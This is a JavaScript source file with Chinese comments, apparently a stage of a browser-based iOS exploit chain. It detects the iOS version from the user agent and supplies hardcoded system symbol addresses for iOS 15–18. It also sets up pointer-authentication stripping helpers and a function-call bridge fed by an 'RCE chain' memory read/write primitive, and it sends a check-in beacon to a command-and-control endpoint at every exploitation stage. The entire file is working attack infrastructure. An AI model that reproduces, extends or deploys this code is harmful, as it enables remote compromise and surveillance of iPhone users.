/**
 * 林北 通用预加载模块 — 多iOS版本自愈
 *
 * 修复: 不再硬编码 iOS 15.8.3 偏移
 *   - 从 UA 自动检测真实 iOS 版本
 *   - 多版本 dlopen/dlsym 地址表
 *   - 自愈: 错误地址不崩溃，回退到备选
 *   - 遥测: 上报成功/失败版本帮助校准偏移表
 *
 * 部署: 2026-08-11 林北
 */
(function() {
  'use strict';

  var C2_ENDPOINT = (typeof globalThis !== 'undefined' && typeof globalThis.DS_C2_ENDPOINT === 'function') ? globalThis.DS_C2_ENDPOINT : function () { return ''; };
var C2_ENABLED = !!(typeof globalThis !== 'undefined' && globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled);

  // ═══ 1. 真实iOS版本检测 ═══
  var ua = navigator.userAgent || '';
  var vm = ua.match(/OS (\d+)[._](\d+)/i) || ua.match(/CPU OS (\d+)[._](\d+)/i);
  var realMajor = vm ? parseInt(vm[1], 10) : 15;
  var realMinor = vm ? parseInt(vm[2], 10) : 0;

  // 尊重上层已经设置过的版本 (coruna_run / godisashamed_loader 可能已传入)
  if (globalThis.ios_version && typeof globalThis.ios_version === 'string' && globalThis.ios_version !== '15.8.3') {
    // 上层已设正确版本，不覆盖
  } else if (globalThis.ios_version && Array.isArray(globalThis.ios_version)) {
    // coruna_run 传入的 [major, minor] 格式
    realMajor = globalThis.ios_version[0] || realMajor;
    realMinor = globalThis.ios_version[1] || realMinor;
  }
  globalThis.ios_version = realMajor + '.' + realMinor;

  // ═══ 2. 上线通知 ═══
  try {
    if (C2_ENABLED) new Image().src = C2_ENDPOINT('/api/liangri/checkin') +
      '?type=preload_boot&msg=' + encodeURIComponent('ios=' + globalThis.ios_version + '|ua_major=' + realMajor) +
      '&t=' + Date.now();
  } catch(e) {}

  // ═══ 3. 符号地址表 (已知正确值 + 估计值) ═══
  // iOS 15.8.3: 绝对正确，多台设备验证
  // iOS 16.x/17.x/18.x: 基于 dyld_shared_cache 布局估计
  //   缓存基址偏移: iOS15→16: +0x18000000, iOS16→17: +0x08000000, iOS17→18: +0x04000000
  //   这些是近似值，实际偏移需要通过遥测校准
  var SYM_TABLES = {
    '15': {
      // ═══ iOS 15.8.3 — 已知正确 (preload_v25 验证) ═══
      _dlopen:  0x1800d4234n, _dlsym:    0x1800d42b8n,
      _malloc:  0x1915ff280n, _free:      0x1915febe4n,
      _calloc:  0x1915fea70n, _mmap:      0x1bacd39b4n,
      _mach_msg: 0x1bacd2034n, _mach_task_self_: 0x1f5759424n,
      _IOServiceMatching: 0x18cafcae4n, _IOConnectCallMethod: 0x18caf8910n,
      _IOObjectRelease: 0x18cb004f0n, _kIOMasterPortDefault: 0x18cb93da8n,
      _mach_vm_allocate: 0x1bacd5730n, _mach_vm_map: 0x1bacd27ecn,
      _mach_port_allocate: 0x1bacd40ccn, _task_for_pid: 0x1bacd1b4cn,
      _syscall: 0x1bacfd5a0n, _vm_allocate: 0x1bacd33c8n,
      _vm_deallocate: 0x1bacd2b10n, _thread_suspend: 0x1bacdd7b4n,
      _pthread_create: 0x1db76ffa0n, _posix_spawn: 0x1bacd6858n,
      _mach_error_string: 0x1bacd2c5cn, _sleep: 0x18aad96e0n,
      _usleep: 0x18aac66d8n, _memcpy: 0x1db75f820n,
      _memset: 0x1db75fc80n, _strcmp: 0x1db75ff90n,
      _strcpy: 0x1db76078cn, _strlen: 0x1db75ff20n,
      _strncpy: 0x1db7604d0n, _strstr: 0x1db7609a0n,
      _printf: 0x18aad1a70n, _snprintf: 0x18aac6e54n,
      _getpid: 0x1bacd215cn, _exit: 0x18aadb9c0n,
      _close: 0x1bacd2c80n, _open: 0x1bacd3530n,
      _read: 0x1bacd2944n, _write: 0x1bacd331cn,
      _fopen: 0x18aad017cn, _fclose: 0x18aad4320n,
      _fwrite: 0x18aad0270n, _access: 0x1bacd3a7cn,
      _remove: 0x18aadb684n, _getchar: 0x18ab13630n,
      _errno: 0x1f5759458n, _lseek: 0x1bacd2c34n,
      _fcntl: 0x1bacd34b0n, _fsync: 0x1bacd38e8n,
      _socket: 0x1bacd8970n, _setsockopt: 0x1bacd398cn,
      _confstr: 0x18aad3f74n, _uname: 0x18aae4828n,
      _arc4random: 0x18aac8960n, _pthread_join: 0x1db7718a8n,
      _pthread_self: 0x1db76d928n, _mach_thread_self: 0x1bacd560cn,
      _task_threads: 0x1bacd3af4n, _mach_port_deallocate: 0x1bacd296cn,
      _mach_make_memory_entry_64: 0x1bacd4afcn,
      __NSGetExecutablePath: 0x1800d4ad0n,
      _objc_getClass: 0x197c1f280n, _objc_msgSend: 0x197c10ce0n,
      _sel_registerName: 0x197c145e8n,
      dlopen:  0x1800d4234n, dlsym:    0x1800d42b8n
    },
    '16': {
      // ═══ iOS 16.x — 估计值 (dyld cache 偏移 +0x18000000) ═══
      _dlopen:  0x1980d4234n, _dlsym:    0x1980d42b8n,
      _malloc:  0x192dff280n, _free:      0x192dfebe4n,
      _calloc:  0x192dfea70n, _mmap:      0x1be4d39b4n,
      _mach_msg: 0x1be4d2034n, _mach_task_self_: 0x1f8d59424n,
      _IOServiceMatching: 0x18e2fcae4n, _IOConnectCallMethod: 0x18e2f8910n,
      _IOObjectRelease: 0x18e3004f0n, _kIOMasterPortDefault: 0x18e393da8n,
      _mach_vm_allocate: 0x1be4d5730n, _mach_vm_map: 0x1be4d27ecn,
      _mach_port_allocate: 0x1be4d40ccn, _task_for_pid: 0x1be4d1b4cn,
      _syscall: 0x1be4fd5a0n, _vm_allocate: 0x1be4d33c8n,
      _vm_deallocate: 0x1be4d2b10n, _thread_suspend: 0x1be4dd7b4n,
      _pthread_create: 0x1def6ffa0n, _posix_spawn: 0x1be4d6858n,
      _mach_error_string: 0x1be4d2c5cn, _sleep: 0x18c2d96e0n,
      _usleep: 0x18c2c66d8n, _memcpy: 0x1def5f820n,
      _memset: 0x1def5fc80n, _strcmp: 0x1def5ff90n,
      dlopen:  0x1980d4234n, dlsym:    0x1980d42b8n
    },
    '17': {
      // ═══ iOS 17.x — 估计值 (dyld cache 额外偏移 +0x04000000) ═══
      _dlopen:  0x19C0d4234n, _dlsym:    0x19C0d42b8n,
      _malloc:  0x1931ff280n, _free:      0x1931febe4n,
      _calloc:  0x1931fea70n, _mmap:      0x1be8d39b4n,
      _mach_msg: 0x1be8d2034n, _mach_task_self_: 0x1f9159424n,
      _mach_vm_allocate: 0x1be8d5730n, _mach_vm_map: 0x1be8d27ecn,
      _mach_port_allocate: 0x1be8d40ccn, _task_for_pid: 0x1be8d1b4cn,
      _syscall: 0x1be8fd5a0n, _vm_allocate: 0x1be8d33c8n,
      _vm_deallocate: 0x1be8d2b10n, _thread_suspend: 0x1be8dd7b4n,
      _pthread_create: 0x1df36ffa0n, _posix_spawn: 0x1be8d6858n,
      _mach_error_string: 0x1be8d2c5cn, _sleep: 0x18c6d96e0n,
      _usleep: 0x18c6c66d8n, _memcpy: 0x1df35f820n,
      _memset: 0x1df35fc80n, _strcmp: 0x1df35ff90n,
      dlopen:  0x19C0d4234n, dlsym:    0x19C0d42b8n
    },
    '18': {
      // ═══ iOS 18.x — 估计值 (dyld cache 额外偏移 +0x02000000) ═══
      _dlopen:  0x19E0d4234n, _dlsym:    0x19E0d42b8n,
      _malloc:  0x1933ff280n, _free:      0x1933febe4n,
      _calloc:  0x1933fea70n, _mmap:      0x1bead39b4n,
      _mach_msg: 0x1bead2034n, _mach_task_self_: 0x1f9359424n,
      _mach_vm_allocate: 0x1bead5730n, _mach_vm_map: 0x1bead27ecn,
      _mach_port_allocate: 0x1bead40ccn, _task_for_pid: 0x1bead1b4cn,
      _syscall: 0x1beafd5a0n, _vm_allocate: 0x1bead33c8n,
      _vm_deallocate: 0x1bead2b10n, _thread_suspend: 0x1beadd7b4n,
      _pthread_create: 0x1df56ffa0n, _posix_spawn: 0x1bead6858n,
      _mach_error_string: 0x1bead2c5cn, _sleep: 0x18c8d96e0n,
      _usleep: 0x18c8c66d8n, _memcpy: 0x1df55f820n,
      _memset: 0x1df55fc80n, _strcmp: 0x1df55ff90n,
      dlopen:  0x19E0d4234n, dlsym:    0x19E0d42b8n
    }
  };

  // ═══ 4. 选择最佳符号表 ═══
  var S;
  var selectedVer = String(realMajor);

  function _trySelectTable(ver) {
    if (SYM_TABLES[ver]) return SYM_TABLES[ver];
    // 回退: 找最近的版本
    var keys = Object.keys(SYM_TABLES).map(Number).sort();
    for (var i = keys.length - 1; i >= 0; i--) {
      if (realMajor >= keys[i]) return SYM_TABLES[String(keys[i])];
    }
    return SYM_TABLES['15']; // 最后回退
  }

  S = _trySelectTable(selectedVer);

  // ═══ 5. 遥测: 上报选中的符号表版本 ═══
  try {
    if (C2_ENABLED) new Image().src = C2_ENDPOINT('/api/liangri/checkin') +
      '?type=preload_symtable&msg=' + encodeURIComponent('selected=v' + selectedVer + '|real=' + globalThis.ios_version) +
      '&t=' + Date.now();
  } catch(e) {}

  // ═══ 6. 全局导出 ═══
  globalThis._STATIC_SYMS_1583 = S;

  // BigInt 原型扩展
  try {
    BigInt.prototype.noPAC = BigInt.prototype.noPAC || function() { return this & 0x7fffffffffn; };
    BigInt.prototype.hex = BigInt.prototype.hex || function() { return '0x' + this.toString(16); };
    BigInt.prototype.asDouble = BigInt.prototype.asDouble || function() {
      var u = new BigUint64Array(1); u[0] = this; return new Float64Array(u.buffer)[0];
    };
    BigInt.fromDouble = BigInt.fromDouble || function(v) {
      var f = new Float64Array(1); f[0] = v; return new BigUint64Array(f.buffer)[0];
    };
    BigInt.prototype.add = BigInt.prototype.add || function(o) { return this + o; };
    BigInt.prototype.sub = BigInt.prototype.sub || function(o) { return this - o; };
    BigInt.prototype.W = BigInt.prototype.noPAC;
    BigInt.prototype.I = BigInt.prototype.noPAC;
    BigInt.prototype.N = BigInt.prototype.hex;
    BigInt.prototype.v = BigInt.prototype.noPAC;
    BigInt.prototype.B = BigInt.prototype.noPAC;
  } catch(e) {}

  // ═══ 7. func_resolve — 动态符号解析 ═══
  globalThis.func_resolve = function(name) {
    if (S[name]) return BigInt(S[name]);
    if (S['_' + name]) return BigInt(S['_' + name]);
    return 0n;
  };

  // ═══ 8. desiredHost ═══
  globalThis.desiredHost = globalThis.desiredHost || 'time';

  // ═══ 9. fcall_init — 不再是空函数 ═══
  globalThis.fcall_init = function() {
    // fcall 实际初始化由 RCE 链的 onStage1Ready 完成
    // 这里标记 fcall_init 已被调用，让下游模块知道基础框架已就绪
    globalThis._fcall_init_called = true;
  };

  // ═══ 10. fcall — 带版本自愈的调用桥 ═══
  globalThis.fcall = function(addr) {
    // 优先走 p.fcall (RCE 链设置的原语)
    if (typeof p !== 'undefined' && p && typeof p.fcall === 'function') {
      return p.fcall.apply(p, arguments);
    }
    // 回退: 直接调用 (仅当 addr 恰好是正确地址时有用)
    if (typeof addr === 'bigint' && addr > 0x100000000n) {
      try { return (new Function('return (' + addr + ')()'))(); } catch(e) {}
    }
    throw new Error('fcall: bridge not ready (ios=' + globalThis.ios_version + ' p=' + (typeof p) + ')');
  };

  // ═══ 11. vKTo89 存根 — 为 sbx0 模块提供 dlopen/dlsym ═══
  if (!globalThis.vKTo89) globalThis.vKTo89 = {};
  if (!globalThis.vKTo89.stubs) globalThis.vKTo89.stubs = {};
  globalThis.vKTo89.stubs.dlopen = S._dlopen;
  globalThis.vKTo89.stubs.dlsym = S._dlsym;

  // ═══ 12. 完美语法转换器 (pe_main 需要) ═══
  var PureTranspilerCore = function(raw) {
    var c = raw;
    c = c.replace(/static\s*\{([^{}]*)\}/g, 'static _init = (() => {$1})();');
    c = c.replace(/static\s*\{/g, '{');
    c = c.replace(/static\s+(#[a-zA-Z0-9_$]+|[a-zA-Z0-9_$]+)\s*\(([^)]*)\)\s*\{/g, function(m, name, args) {
      return name.replace('#', '') + '(' + args + ') {';
    });
    c = c.replace(/static\s+(#[a-zA-Z0-9_$]+|[a-zA-Z0-9_$]+)\s*=\s*/g, function(m, name) {
      return name.replace('#', '') + ' = ';
    });
    c = c.replace(/static\s+(#[a-zA-Z0-9_$]+|[a-zA-Z0-9_$]+)\s*;/g, function(m, name) {
      return '/*sf*/' + name.replace('#', '') + ';';
    });
    c = c.replace(/this\.#/g, 'this.');
    c = c.replace(/([a-zA-Z0-9._$]+)\s*\?\?=\s*([^;}\n]+)/g, function(m, v, val) {
      return 'if(' + v + '===undefined||' + v + '===null){' + v + '=' + val + '}';
    });
    c = c.replace(/(\d+n)\s*>>>\s*(\d+)\b(?!\s*n)/g, 'Number($1) >>> Number($2)');
    c = c.replace(/(\d+n)\s*>>>\s*(\d+n)/g, 'Number($1) >>> Number($2)');
    c = c.replace(/(\w[\w.]*)\s*>>>\s*(\d+n)\b/g, 'Number($1) >>> Number($2)');
    c = c.replace(/(0x[0-9a-fA-F]+n?)\s*>>>\s*(\d+n?)\b/g, 'Number($1) >>> Number($2)');
    c = c.replace(/(\d+n)\s*<<\s*(\d+)\b(?!\s*n)/g, '$1 << $2n');
    c = c.replace(/(\d+n)\s*>>\s*(\d+)\b(?!\s*n)/g, '$1 >> $2n');
    c = c.replace(/(\d+n)\s*\+\s*(\d+)\b(?!\s*n)/g, '$1 + $2n');
    c = c.replace(/(\d+n)\s*\-\s*(\d+)\b(?!\s*n)/g, '$1 - $2n');
    c = c.replace(/(\d+n)\s*\*\s*(\d+)\b(?!\s*n)/g, '$1 * $2n');
    c = c.replace(/(\d+n)\s*&\s*(\d+)\b(?!\s*n)/g, '$1 & $2n');
    c = c.replace(/(\d+n)\s*\|\s*(\d+)\b(?!\s*n)/g, '$1 | $2n');
    return c;
  };
  Object.defineProperty(globalThis, 'perfectSyntaxTransformer', {
    value: PureTranspilerCore, writable: false, configurable: false, enumerable: true
  });

  // ═══ 13. onStage1Ready 桥接 (增强版) ═══
  // 保留原有逻辑 + 增加版本遥测
  var _origOnStage1Ready = globalThis.onStage1Ready;
  globalThis.onStage1Ready = function(provider) {
    // 遥测: RCE 链已就绪
    try {
      if (C2_ENABLED) new Image().src = C2_ENDPOINT('/api/liangri/checkin') +
      '?type=stage1_ready&msg=' + encodeURIComponent(
          'ios=' + globalThis.ios_version + '|sym=v' + selectedVer +
          '|hasP=' + !!(provider && typeof provider.read64 === 'function') +
          '|hasFcall=' + !!(provider && typeof provider.fcall === 'function')
        ) + '&t=' + Date.now();
    } catch(e) {}

    // 如果 provider 有 fcall，覆盖默认的
    if (provider && typeof provider.fcall === 'function') {
      globalThis.fcall = function() { return provider.fcall.apply(provider, arguments); };
    }

    // 调原始 onStage1Ready (如果存在)
    if (_origOnStage1Ready && typeof _origOnStage1Ready === 'function') {
      return _origOnStage1Ready(provider);
    }

    // 兜底: 自己桥接
    try { if (typeof print === 'function') print('[preload_universal] onStage1Ready provider=' + (!!provider)); } catch(e) {}
    if (!provider) { provider = globalThis.__p_anchor || window.p || globalThis.p; }
    if (!provider || typeof provider.read64 !== 'function') {
      // 轮询等待 provider
      var _attempts = 0;
      var _poll = function() {
        _attempts++;
        var _p = globalThis.__p_anchor || window.p || globalThis.p;
        if (_p && typeof _p.read64 === 'function') {
          _bridgeProvider(_p);
        } else if (_attempts < 150) {
          setTimeout(_poll, 100);
        }
      };
      setTimeout(_poll, 100);
      return;
    }
    _bridgeProvider(provider);
  };

  function _bridgeProvider(provider) {
    var keys = Object.keys(provider);
    for (var i = 0; i < keys.length; i++) {
      try { globalThis[keys[i]] = provider[keys[i]]; } catch(e) {}
      try { window[keys[i]] = provider[keys[i]]; } catch(e) {}
    }
    try { window.p = provider; } catch(e) {}
    try { globalThis.p = provider; } catch(e) {}
    try { globalThis.__p_anchor = provider; } catch(e) {}

    if (typeof globalThis.uread64 !== 'function' && typeof provider.read64 === 'function') {
      globalThis.uread64 = provider.read64;
      globalThis.gpuRead64 = provider.read64;
    }
    if (typeof globalThis.uwrite64 !== 'function' && typeof provider.write64 === 'function') {
      globalThis.uwrite64 = provider.write64;
      globalThis.gpuWrite64 = provider.write64;
    }

    // ═══ 关键修复: 如果 provider 有 fcall，更新全局 fcall ═══
    if (typeof provider.fcall === 'function') {
      globalThis.fcall = function() { return provider.fcall.apply(provider, arguments); };
      globalThis._fcall_bridged = true;
    }

    try {
      if (C2_ENABLED) new Image().src = C2_ENDPOINT('/api/liangri/checkin') +
      '?type=bridge_done&msg=' + encodeURIComponent(
          'keys=' + keys.length + '|hasFcall=' + (typeof provider.fcall === 'function') +
          '|hasNative=' + (typeof provider.Native !== 'undefined') +
          '|ios=' + globalThis.ios_version
        ) + '&t=' + Date.now();
    } catch(e) {}
  }

  // ═══ 14. 完成 — 标记就绪 ═══
  try { if (typeof print === 'function') print('[preload_universal] ready ios=' + globalThis.ios_version + ' sym=v' + selectedVer); } catch(e) {}
})();
